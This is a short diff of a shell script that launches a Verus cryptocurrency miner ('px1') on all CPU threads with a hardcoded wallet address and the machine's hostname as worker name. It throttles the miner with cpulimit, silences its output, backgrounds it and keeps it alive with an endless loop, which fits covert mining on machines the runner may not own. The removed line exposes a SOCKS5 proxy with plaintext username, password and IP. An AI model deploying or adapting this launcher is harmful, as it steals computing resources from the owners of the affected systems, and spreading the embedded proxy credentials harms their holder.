@@ -7,6 +7,6 @@ chmod +x px1
 pool="pool.verus.io:9998"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-proxy="socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880"
-cpulimit -l 30 ./px1 -a verus -o $pool -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$workername -t $thread $prox >/dev/null 2>&1 >/dev/null &
+
+cpulimit -l 30 ./px1 -a verus -o $pool -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$workername -t $thread
 while :; do echo "system true"; sleep 2m; done
